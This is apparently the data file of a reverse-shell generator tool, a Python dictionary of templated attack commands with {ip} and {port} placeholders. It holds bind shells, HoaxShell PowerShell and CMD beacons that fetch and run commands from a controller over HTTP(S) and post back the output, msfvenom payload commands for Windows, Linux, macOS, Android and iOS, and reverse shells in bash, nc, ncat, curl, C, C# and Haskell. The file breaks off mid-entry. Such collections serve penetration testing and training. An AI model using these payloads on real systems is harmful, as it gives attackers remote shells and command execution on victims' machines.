data = {'bindShellCommands': [{'command': 'python3 -c \'exec("""import socket as '
                                   's,subprocess as '
                                   'sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, '
                                   '1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\n'
                                   'while True: '
                                   'd=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\'',
                        'meta': ['bind',
                                 'mac',
                                 'linux',
                                 'windows',
                                 'BindShell'],
                        'name': 'Python3 Bind'},
                       {'command': 'php -r '
                                   '\'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ '
                                   '",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\'',
                        'meta': ['bind',
                                 'mac',
                                 'linux',
                                 'windows',
                                 'BindShell'],
                        'name': 'PHP Bind'},
                       {'command': 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
                                   '/bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > '
                                   '/tmp/f',
                        'meta': ['bind', 'mac', 'linux', 'BindShell'],
                        'name': 'nc Bind'},
                       {'command': "perl -e 'use "
                                   'Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, '
                                   'INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close '
                                   'C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh '
                                   '-i");};\'',
                        'meta': ['bind', 'mac', 'linux', 'BindShell'],
                        'name': 'Perl Bind'}],
 'hoaxShellCommands': [{'command': '@echo off&cmd /V:ON /C "SET '
                                   'ip={ip}:{port}&&SET sid="Authorization: '
                                   'eb6a44aa-8acc1e56-629ea455"&&SET '
                                   'protocol=http://&&curl '
                                   '!protocol!!ip!/eb6a44aa -H !sid! > NUL && '
                                   'for /L %i in (0) do (curl -s '
                                   '!protocol!!ip!/8acc1e56 -H !sid! > '
                                   '!temp!cmd.bat & type !temp!cmd.bat | '
                                   'findstr None > NUL & if errorlevel 1 '
                                   '((!temp!cmd.bat > !tmp!out.txt 2>&1) & '
                                   'curl !protocol!!ip!/629ea455 -X POST -H '
                                   '!sid! --data-binary @!temp!out.txt > NUL)) '
                                   '& timeout 1" > NUL',
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'Windows CMD cURL'},
                       {'command': "$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM "
                                   '-UseBasicParsing -Uri $p$s/14f30f27 '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(IRM -UseBasicParsing -Uri '
                                   '$p$s/650c00d7 -Headers '
                                   '@{"Authorization"=$i});if ($c -ne '
                                   "'None') {$r=IEX $c -ErrorAction Stop "
                                   '-ErrorVariable e;$r=Out-String '
                                   '-InputObject $r;$t=IRM -Uri $p$s/fef40df7 '
                                   '-Method POST -Headers '
                                   '@{"Authorization"=$i} -Body '
                                   '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                   "-join ' ')} sleep 0.8}",
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell IEX'},
                       {'command': "$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM "
                                   '-UseBasicParsing -Uri $p$s/bf5e666f '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(IRM -UseBasicParsing -Uri '
                                   '$p$s/5498a73c -Headers '
                                   '@{"Authorization"=$i});if ($c -ne '
                                   "'None') {$r=IEX $c -ErrorAction Stop "
                                   '-ErrorVariable e;$r=Out-String '
                                   '-InputObject $r;$t=IRM -Uri $p$s/34007c82 '
                                   '-Method POST -Headers '
                                   '@{"Authorization"=$i} -Body ($e+$r)} sleep '
                                   '0.8}',
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell IEX Constr Lang Mode'},
                       {'command': '$s=\'{ip}:{port}\';$i=\'add29918-6263f3e6-2f810c1e\';$p=\'http://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod '
                                   '-UseBasicParsing -Uri $p$s/add29918 '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(Invoke-RestMethod '
                                   '-UseBasicParsing -Uri $p$s/6263f3e6 '
                                   '-Headers @{"Authorization"=$i});if ($c -eq '
                                   "'exit') {del $f;exit} elseif ($c -ne "
                                   '\'None\') {echo "$c" | out-file -filepath '
                                   '$f;$r=powershell -ep bypass $f '
                                   '-ErrorAction Stop -ErrorVariable '
                                   'e;$r=Out-String -InputObject '
                                   '$r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e '
                                   '-Method POST -Headers '
                                   '@{"Authorization"=$i} -Body '
                                   '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                   "-join ' ')} sleep 0.8}",
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell Outfile'},
                       {'command': '$s=\'{ip}:{port}\';$i=\'e030d4f6-9393dc2a-dd9e00a7\';$p=\'http://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM '
                                   '-UseBasicParsing -Uri $p$s/e030d4f6 '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(IRM -UseBasicParsing -Uri '
                                   '$p$s/9393dc2a -Headers '
                                   '@{"Authorization"=$i}); if ($c -eq '
                                   "'exit') {del $f;exit} elseif ($c -ne "
                                   '\'None\') {echo "$c" | out-file -filepath '
                                   '$f;$r=powershell -ep bypass $f '
                                   '-ErrorAction Stop -ErrorVariable '
                                   'e;$r=Out-String -InputObject $r;$t=IRM '
                                   '-Uri $p$s/dd9e00a7 -Method POST -Headers '
                                   '@{"Authorization"=$i} -Body ($e+$r)} sleep '
                                   '0.8}',
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell Outfile Constr Lang Mode'},
                       {'command': '@echo off&cmd /V:ON /C "SET '
                                   'ip={ip}:{port}&&SET sid="Authorization: '
                                   'eb6a44aa-8acc1e56-629ea455"&&SET '
                                   'protocol=https://&&curl -fs -k '
                                   '!protocol!!ip!/eb6a44aa -H !sid! > NUL & '
                                   'for /L %i in (0) do (curl -fs -k '
                                   '!protocol!!ip!/8acc1e56 -H !sid! > '
                                   '!temp!cmd.bat & type !temp!cmd.bat | '
                                   'findstr None > NUL & if errorlevel 1 '
                                   '((!temp!cmd.bat > !tmp!out.txt 2>&1) & '
                                   'curl -fs -k !protocol!!ip!/629ea455 -X '
                                   'POST -H !sid! --data-binary @!temp!out.txt '
                                   '> NUL)) & timeout 1" > NUL',
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'Windows CMD cURL https'},
                       {'command': 'add-type @"\n'
                                   'using System.Net;using '
                                   'System.Security.Cryptography.X509Certificates;\n'
                                   'public class TrustAllCertsPolicy : '
                                   'ICertificatePolicy {public bool '
                                   'CheckValidationResult(\n'
                                   'ServicePoint srvPoint, X509Certificate '
                                   'certificate,WebRequest request, int '
                                   'certificateProblem) {return true;}}\n'
                                   '"@\n'
                                   '[System.Net.ServicePointManager]::CertificatePolicy '
                                   '= New-Object TrustAllCertsPolicy\n'
                                   "$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod "
                                   '-UseBasicParsing -Uri $p$s/1cdbb583 '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(Invoke-RestMethod '
                                   '-UseBasicParsing -Uri $p$s/f96894ff '
                                   '-Headers @{"Authorization"=$i});if ($c -ne '
                                   "'None') {$r=iex $c -ErrorAction Stop "
                                   '-ErrorVariable e;$r=Out-String '
                                   '-InputObject $r;$t=Invoke-RestMethod -Uri '
                                   '$p$s/f99b8edc -Method POST -Headers '
                                   '@{"Authorization"=$i} -Body '
                                   '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                   "-join ' ')} sleep 0.8}",
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell IEX https'},
                       {'command': 'add-type @"\n'
                                   'using System.Net;using '
                                   'System.Security.Cryptography.X509Certificates;\n'
                                   'public class TrustAllCertsPolicy : '
                                   'ICertificatePolicy {public bool '
                                   'CheckValidationResult(\n'
                                   'ServicePoint srvPoint, X509Certificate '
                                   'certificate,WebRequest request, int '
                                   'certificateProblem) {return true;}}\n'
                                   '"@\n'
                                   '[System.Net.ServicePointManager]::CertificatePolicy '
                                   '= New-Object TrustAllCertsPolicy\n'
                                   "$s='{ip}:{port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod "
                                   '-UseBasicParsing -Uri $p$s/11e6bc4b '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(Invoke-RestMethod '
                                   '-UseBasicParsing -Uri $p$s/fefb1eab '
                                   '-Headers @{"Authorization"=$i});if ($c -ne '
                                   "'None') {$r=iex $c -ErrorAction Stop "
                                   '-ErrorVariable e;$r=Out-String '
                                   '-InputObject $r;$t=Invoke-RestMethod -Uri '
                                   '$p$s/68a9612e -Method POST -Headers '
                                   '@{"Authorization"=$i} -Body ($e+$r)} sleep '
                                   '0.8}',
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell Constr Lang Mode IEX https'},
                       {'command': 'add-type @"\n'
                                   'using System.Net;using '
                                   'System.Security.Cryptography.X509Certificates;\n'
                                   'public class TrustAllCertsPolicy : '
                                   'ICertificatePolicy {public bool '
                                   'CheckValidationResult(\n'
                                   'ServicePoint srvPoint, X509Certificate '
                                   'certificate,WebRequest request, int '
                                   'certificateProblem) {return true;}}\n'
                                   '"@\n'
                                   '[System.Net.ServicePointManager]::CertificatePolicy '
                                   '= New-Object TrustAllCertsPolicy\n'
                                   '$s=\'{ip}:{port}\';$i=\'add29918-6263f3e6-2f810c1e\';$p=\'https://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod '
                                   '-UseBasicParsing -Uri $p$s/add29918 '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(Invoke-RestMethod '
                                   '-UseBasicParsing -Uri $p$s/6263f3e6 '
                                   '-Headers @{"Authorization"=$i});if ($c -eq '
                                   "'exit') {del $f;exit} elseif ($c -ne "
                                   '\'None\') {echo "$c" | out-file -filepath '
                                   '$f;$r=powershell -ep bypass $f '
                                   '-ErrorAction Stop -ErrorVariable '
                                   'e;$r=Out-String -InputObject '
                                   '$r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e '
                                   '-Method POST -Headers '
                                   '@{"Authorization"=$i} -Body '
                                   '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                   "-join ' ')} sleep 0.8}",
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell Outfile https'},
                       {'command': 'add-type @"\n'
                                   'using System.Net;using '
                                   'System.Security.Cryptography.X509Certificates;\n'
                                   'public class TrustAllCertsPolicy : '
                                   'ICertificatePolicy {public bool '
                                   'CheckValidationResult(\n'
                                   'ServicePoint srvPoint, X509Certificate '
                                   'certificate,WebRequest request, int '
                                   'certificateProblem) {return true;}}\n'
                                   '"@\n'
                                   '[System.Net.ServicePointManager]::CertificatePolicy '
                                   '= New-Object TrustAllCertsPolicy\n'
                                   '$s=\'{ip}:{port}\';$i=\'e030d4f6-9393dc2a-dd9e00a7\';$p=\'https://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM '
                                   '-UseBasicParsing -Uri $p$s/e030d4f6 '
                                   '-Headers @{"Authorization"=$i};while '
                                   '($true){$c=(IRM -UseBasicParsing -Uri '
                                   '$p$s/9393dc2a -Headers '
                                   '@{"Authorization"=$i}); if ($c -eq '
                                   "'exit') {del $f;exit} elseif ($c -ne "
                                   '\'None\') {echo "$c" | out-file -filepath '
                                   '$f;$r=powershell -ep bypass $f '
                                   '-ErrorAction Stop -ErrorVariable '
                                   'e;$r=Out-String -InputObject $r;$t=IRM '
                                   '-Uri $p$s/dd9e00a7 -Method POST -Headers '
                                   '@{"Authorization"=$i} -Body ($e+$r)} sleep '
                                   '0.8}',
                        'meta': ['windows', 'HoaxShell'],
                        'name': 'PowerShell Outfile Constr Lang Mode https'}],
 'msfvenomCommands': [{'command': 'msfvenom -p '
                                  'windows/x64/meterpreter/reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f exe -o '
                                  'reverse.exe',
                       'meta': ['msfvenom',
                                'windows',
                                'staged',
                                'meterpreter',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Windows Meterpreter Staged Reverse TCP (x64)'},
                      {'command': 'msfvenom -p '
                                  'windows/x64/meterpreter_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f exe -o '
                                  'reverse.exe',
                       'meta': ['msfvenom',
                                'windows',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Windows Meterpreter Stageless Reverse TCP '
                               '(x64)'},
                      {'command': 'msfvenom -p windows/x64/shell/reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f exe -o '
                                  'reverse.exe',
                       'meta': ['msfvenom',
                                'windows',
                                'staged',
                                'meterpreter',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Windows Staged Reverse TCP (x64)'},
                      {'command': 'msfvenom -p windows/x64/shell_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f exe -o '
                                  'reverse.exe',
                       'meta': ['msfvenom',
                                'windows',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Windows Stageless Reverse TCP (x64)'},
                      {'command': 'msfvenom -p '
                                  'windows/x64/meterpreter/reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp',
                       'meta': ['msfvenom',
                                'windows',
                                'staged',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Windows Staged JSP Reverse TCP'},
                      {'command': 'msfvenom -p '
                                  'linux/x64/meterpreter/reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f elf -o '
                                  'reverse.elf',
                       'meta': ['msfvenom',
                                'linux',
                                'meterpreter',
                                'staged',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Linux Meterpreter Staged Reverse TCP (x64)'},
                      {'command': 'msfvenom -p linux/x64/shell_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f elf -o '
                                  'reverse.elf',
                       'meta': ['msfvenom',
                                'linux',
                                'meterpreter',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Linux Stageless Reverse TCP (x64)'},
                      {'command': 'msfvenom -a x86 --platform Windows -p '
                                  'windows/shell/bind_tcp -e '
                                  "x86/shikata_ga_nai -b '\x00' -f python -v "
                                  'notBuf -o shellcode',
                       'meta': ['msfvenom',
                                'windows',
                                'bind',
                                'bufferoverflow',
                                'MSFVenom'],
                       'name': 'Windows Bind TCP ShellCode - BOF'},
                      {'command': 'msfvenom -p osx/x64/meterpreter/reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f macho -o '
                                  'shell.macho',
                       'meta': ['msfvenom',
                                'mac',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'macOS Meterpreter Staged Reverse TCP (x64)'},
                      {'command': 'msfvenom -p osx/x64/meterpreter_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f macho -o '
                                  'shell.macho',
                       'meta': ['msfvenom',
                                'mac',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'macOS Meterpreter Stageless Reverse TCP (x64)'},
                      {'command': 'msfvenom -p osx/x64/shell_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f macho -o '
                                  'shell.macho',
                       'meta': ['msfvenom',
                                'mac',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'macOS Stageless Reverse TCP (x64)'},
                      {'command': 'msfvenom -p php/meterpreter_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f raw -o shell.php',
                       'meta': ['msfvenom',
                                'windows',
                                'linux',
                                'meterpreter',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'PHP Meterpreter Stageless Reverse TCP'},
                      {'command': 'msfvenom -p php/reverse_php LHOST={ip} '
                                  'LPORT={port} -o shell.php',
                       'meta': ['msfvenom',
                                'windows',
                                'linux',
                                'meterpreter',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'PHP Reverse PHP'},
                      {'command': 'msfvenom -p java/jsp_shell_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f raw -o shell.jsp',
                       'meta': ['msfvenom',
                                'windows',
                                'linux',
                                'meterpreter',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'JSP Stageless Reverse TCP'},
                      {'command': 'msfvenom -p java/shell_reverse_tcp '
                                  'LHOST={ip} LPORT={port} -f war -o shell.war',
                       'meta': ['msfvenom',
                                'windows',
                                'linux',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'WAR Stageless Reverse TCP'},
                      {'command': 'msfvenom --platform android -p '
                                  'android/meterpreter/reverse_tcp lhost={ip} '
                                  'lport={port} R -o malicious.apk',
                       'meta': ['msfvenom',
                                'android',
                                'android',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Android Meterpreter Reverse TCP'},
                      {'command': 'msfvenom --platform android -x '
                                  'template-app.apk -p '
                                  'android/meterpreter/reverse_tcp lhost={ip} '
                                  'lport={port} -o payload.apk',
                       'meta': ['msfvenom',
                                'android',
                                'android',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Android Meterpreter Embed Reverse TCP'},
                      {'command': 'msfvenom --platform apple_ios -p '
                                  'apple_ios/aarch64/meterpreter_reverse_tcp '
                                  'lhost={ip} lport={port} -f macho -o payload',
                       'meta': ['msfvenom',
                                'apple_ios',
                                'apple_ios',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Apple iOS Meterpreter Reverse TCP Inline'},
                      {'command': 'msfvenom -p cmd/unix/reverse_python '
                                  'LHOST={ip} LPORT={port} -f raw',
                       'meta': ['msfvenom',
                                'windows',
                                'linux',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Python Stageless Reverse TCP'},
                      {'command': 'msfvenom -p cmd/unix/reverse_bash '
                                  'LHOST={ip} LPORT={port} -f raw -o shell.sh',
                       'meta': ['msfvenom',
                                'linux',
                                'macos',
                                'stageless',
                                'reverse',
                                'MSFVenom'],
                       'name': 'Bash Stageless Reverse TCP'}],
 'reverseShellCommands': [{'command': '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Bash -i'},
                          {'command': '0<&196;exec 196<>/dev/tcp/{ip}/{port}; '
                                      '{shell} <&196 >&196 2>&196',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Bash 196'},
                          {'command': 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | '
                                      'while read line; do $line 2>&5 >&5; '
                                      'done',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Bash read line'},
                          {'command': '{shell} -i 5<> /dev/tcp/{ip}/{port} '
                                      '0<&5 1>&5 2>&5',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Bash 5'},
                          {'command': '{shell} -i >& /dev/udp/{ip}/{port} 0>&1',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Bash udp'},
                          {'command': 'rm /tmp/f;mkfifo /tmp/f;cat '
                                      '/tmp/f|{shell} -i 2>&1|nc {ip} {port} '
                                      '>/tmp/f',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'nc mkfifo'},
                          {'command': 'nc {ip} {port} -e {shell}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'nc -e'},
                          {'command': 'nc.exe {ip} {port} -e {shell}',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'nc.exe -e'},
                          {'command': 'busybox nc {ip} {port} -e {shell}',
                           'meta': ['linux', 'ReverseShell'],
                           'name': 'BusyBox nc -e'},
                          {'command': 'nc -c {shell} {ip} {port}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'nc -c'},
                          {'command': 'ncat {ip} {port} -e {shell}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'ncat -e'},
                          {'command': 'ncat.exe {ip} {port} -e {shell}',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'ncat.exe -e'},
                          {'command': 'rm /tmp/f;mkfifo /tmp/f;cat '
                                      '/tmp/f|{shell} -i 2>&1|ncat -u {ip} '
                                      '{port} >/tmp/f',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'ncat udp'},
                          {'command': "C='curl -Ns telnet://{ip}:{port}'; $C "
                                      '</dev/null 2>&1 | {shell} 2>&1 | $C '
                                      '>/dev/null',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'curl'},
                          {'command': 'rcat connect -s {shell} {ip} {port}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'rustcat'},
                          {'command': '#include <stdio.h>\n'
                                      '#include <sys/socket.h>\n'
                                      '#include <sys/types.h>\n'
                                      '#include <stdlib.h>\n'
                                      '#include <unistd.h>\n'
                                      '#include <netinet/in.h>\n'
                                      '#include <arpa/inet.h>\n'
                                      '\n'
                                      'int main(void){\n'
                                      '    int port = {port};\n'
                                      '    struct sockaddr_in revsockaddr;\n'
                                      '\n'
                                      '    int sockt = socket(AF_INET, '
                                      'SOCK_STREAM, 0);\n'
                                      '    revsockaddr.sin_family = '
                                      'AF_INET;       \n'
                                      '    revsockaddr.sin_port = '
                                      'htons(port);\n'
                                      '    revsockaddr.sin_addr.s_addr = '
                                      'inet_addr("{ip}");\n'
                                      '\n'
                                      '    connect(sockt, (struct sockaddr *) '
                                      '&revsockaddr, \n'
                                      '    sizeof(revsockaddr));\n'
                                      '    dup2(sockt, 0);\n'
                                      '    dup2(sockt, 1);\n'
                                      '    dup2(sockt, 2);\n'
                                      '\n'
                                      '    char * const argv[] = {"{shell}", '
                                      'NULL};\n'
                                      '    execve("{shell}", argv, NULL);\n'
                                      '\n'
                                      '    return 0;       \n'
                                      '}',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'C'},
                          {'command': '#include <winsock2.h>\r\n'
                                      '#include <stdio.h>\r\n'
                                      '#pragma comment(lib,"ws2_32")\r\n'
                                      '\r\n'
                                      'WSADATA wsaData;\r\n'
                                      'SOCKET Winsock;\r\n'
                                      'struct sockaddr_in hax; \r\n'
                                      'char ip_addr[16] = "{ip}"; \r\n'
                                      'char port[6] = "{port}";            \r\n'
                                      '\r\n'
                                      'STARTUPINFO ini_processo;\r\n'
                                      '\r\n'
                                      'PROCESS_INFORMATION processo_info;\r\n'
                                      '\r\n'
                                      'int main()\r\n'
                                      '{\r\n'
                                      '    WSAStartup(MAKEWORD(2, 2), '
                                      '&wsaData);\r\n'
                                      '    Winsock = WSASocket(AF_INET, '
                                      'SOCK_STREAM, IPPROTO_TCP, NULL, '
                                      '(unsigned int)NULL, (unsigned '
                                      'int)NULL);\r\n'
                                      '\r\n'
                                      '\r\n'
                                      '    struct hostent *host; \r\n'
                                      '    host = gethostbyname(ip_addr);\r\n'
                                      '    strcpy_s(ip_addr, 16, '
                                      'inet_ntoa(*((struct in_addr '
                                      '*)host->h_addr)));\r\n'
                                      '\r\n'
                                      '    hax.sin_family = AF_INET;\r\n'
                                      '    hax.sin_port = '
                                      'htons(atoi(port));\r\n'
                                      '    hax.sin_addr.s_addr = '
                                      'inet_addr(ip_addr);\r\n'
                                      '\r\n'
                                      '    WSAConnect(Winsock, '
                                      '(SOCKADDR*)&hax, sizeof(hax), NULL, '
                                      'NULL, NULL, NULL);\r\n'
                                      '\r\n'
                                      '    memset(&ini_processo, 0, '
                                      'sizeof(ini_processo));\r\n'
                                      '    ini_processo.cb = '
                                      'sizeof(ini_processo);\r\n'
                                      '    ini_processo.dwFlags = '
                                      'STARTF_USESTDHANDLES | '
                                      'STARTF_USESHOWWINDOW; \r\n'
                                      '    ini_processo.hStdInput = '
                                      'ini_processo.hStdOutput = '
                                      'ini_processo.hStdError = '
                                      '(HANDLE)Winsock;\r\n'
                                      '\r\n'
                                      '    TCHAR cmd[255] = '
                                      'TEXT("cmd.exe");\r\n'
                                      '\r\n'
                                      '    CreateProcess(NULL, cmd, NULL, '
                                      'NULL, TRUE, 0, NULL, NULL, '
                                      '&ini_processo, &processo_info);\r\n'
                                      '\r\n'
                                      '    return 0;\r\n'
                                      '}',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'C Windows'},
                          {'command': 'using System;\n'
                                      'using System.Text;\n'
                                      'using System.IO;\n'
                                      'using System.Diagnostics;\n'
                                      'using System.ComponentModel;\n'
                                      'using System.Linq;\n'
                                      'using System.Net;\n'
                                      'using System.Net.Sockets;\n'
                                      '\n'
                                      '\n'
                                      'namespace ConnectBack\n'
                                      '{\n'
                                      '\tpublic class Program\n'
                                      '\t{\n'
                                      '\t\tstatic StreamWriter streamWriter;\n'
                                      '\n'
                                      '\t\tpublic static void Main(string[] '
                                      'args)\n'
                                      '\t\t{\n'
                                      '\t\t\tusing(TcpClient client = new '
                                      'TcpClient("{ip}", {port}))\n'
                                      '\t\t\t{\n'
                                      '\t\t\t\tusing(Stream stream = '
                                      'client.GetStream())\n'
                                      '\t\t\t\t{\n'
                                      '\t\t\t\t\tusing(StreamReader rdr = new '
                                      'StreamReader(stream))\n'
                                      '\t\t\t\t\t{\n'
                                      '\t\t\t\t\t\tstreamWriter = new '
                                      'StreamWriter(stream);\n'
                                      '\t\t\t\t\t\t\n'
                                      '\t\t\t\t\t\tStringBuilder strInput = '
                                      'new StringBuilder();\n'
                                      '\n'
                                      '\t\t\t\t\t\tProcess p = new Process();\n'
                                      '\t\t\t\t\t\tp.StartInfo.FileName = '
                                      '"{shell}";\n'
                                      '\t\t\t\t\t\tp.StartInfo.CreateNoWindow '
                                      '= true;\n'
                                      '\t\t\t\t\t\tp.StartInfo.UseShellExecute '
                                      '= false;\n'
                                      '\t\t\t\t\t\t'
                                      'p.StartInfo.RedirectStandardOutput = '
                                      'true;\n'
                                      '\t\t\t\t\t\t'
                                      'p.StartInfo.RedirectStandardInput = '
                                      'true;\n'
                                      '\t\t\t\t\t\t'
                                      'p.StartInfo.RedirectStandardError = '
                                      'true;\n'
                                      '\t\t\t\t\t\tp.OutputDataReceived += new '
                                      'DataReceivedEventHandler(CmdOutputDataHandler);\n'
                                      '\t\t\t\t\t\tp.Start();\n'
                                      '\t\t\t\t\t\tp.BeginOutputReadLine();\n'
                                      '\n'
                                      '\t\t\t\t\t\twhile(true)\n'
                                      '\t\t\t\t\t\t{\n'
                                      '\t\t\t\t\t\t\t'
                                      'strInput.Append(rdr.ReadLine());\n'
                                      '\t\t\t\t\t\t\t'
                                      '//strInput.Append("\\n");\n'
                                      '\t\t\t\t\t\t\t'
                                      'p.StandardInput.WriteLine(strInput);\n'
                                      '\t\t\t\t\t\t\tstrInput.Remove(0, '
                                      'strInput.Length);\n'
                                      '\t\t\t\t\t\t}\n'
                                      '\t\t\t\t\t}\n'
                                      '\t\t\t\t}\n'
                                      '\t\t\t}\n'
                                      '\t\t}\n'
                                      '\n'
                                      '\t\tprivate static void '
                                      'CmdOutputDataHandler(object '
                                      'sendingProcess, DataReceivedEventArgs '
                                      'outLine)\n'
                                      '        {\n'
                                      '            StringBuilder strOutput = '
                                      'new StringBuilder();\n'
                                      '\n'
                                      '            if '
                                      '(!String.IsNullOrEmpty(outLine.Data))\n'
                                      '            {\n'
                                      '                try\n'
                                      '                {\n'
                                      '                    '
                                      'strOutput.Append(outLine.Data);\n'
                                      '                    '
                                      'streamWriter.WriteLine(strOutput);\n'
                                      '                    '
                                      'streamWriter.Flush();\n'
                                      '                }\n'
                                      '                catch (Exception err) { '
                                      '}\n'
                                      '            }\n'
                                      '        }\n'
                                      '\n'
                                      '\t}\n'
                                      '}',
                           'meta': ['linux', 'windows', 'ReverseShell'],
                           'name': 'C# TCP Client'},
                          {'command': 'using System;\n'
                                      'using System.Diagnostics;\n'
                                      '\n'
                                      'namespace BackConnect {\n'
                                      '  class ReverseBash {\n'
                                      '\tpublic static void Main(string[] '
                                      'args) {\n'
                                      '\t  Process proc = new '
                                      'System.Diagnostics.Process();\n'
                                      '\t  proc.StartInfo.FileName = '
                                      '"{shell}";\n'
                                      '\t  proc.StartInfo.Arguments = "-c '
                                      '\\"{shell} -i >& /dev/tcp/{ip}/{port} '
                                      '0>&1\\"";\n'
                                      '\t  proc.StartInfo.UseShellExecute = '
                                      'false;\n'
                                      '\t  '
                                      'proc.StartInfo.RedirectStandardOutput = '
                                      'true;\n'
                                      '\t  proc.Start();\n'
                                      '\n'
                                      '\t  while '
                                      '(!proc.StandardOutput.EndOfStream) {\n'
                                      '\t\t'
                                      'Console.WriteLine(proc.StandardOutput.ReadLine());\n'
                                      '\t  }\n'
                                      '\t}\n'
                                      '  }\n'
                                      '}\n',
                           'meta': ['linux', 'windows', 'ReverseShell'],
                           'name': 'C# Bash -i'},
                          {'command': 'module Main where\n'
                                      '\n'
                                      'import System.Process\n'
                                      '\n'
                                      'main = callCommand "rm /tmp/f;mkfifo '
                                      '/tmp/f;cat /tmp/f | {shell} -i 2>&1 | '
                                      'nc {ip} {port} >/tmp/f"',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Haskell #1'},
                          {'command': "perl -e 'use "
